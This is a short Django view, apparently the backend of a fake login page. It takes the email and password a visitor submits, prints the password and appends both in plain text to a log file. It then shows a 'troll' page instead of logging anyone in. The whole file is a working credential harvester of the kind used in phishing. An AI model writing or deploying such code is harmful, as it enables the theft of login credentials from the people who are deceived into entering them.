from django.shortcuts import render, redirect
from django.http import HttpResponse

def login(request):
    if request.method == 'GET':
        return render(request, 'index.html')
    
    if request.method == 'POST':
        email = request.POST.get('email')
        senha = request.POST.get('pass')

        print(senha)

        txt = open('.\\templates\\log.txt', 'a')

        txt.write(f'Email:{email}\nSenha:{senha}\n')
        txt.close()

        return render(request, 'troll.html')

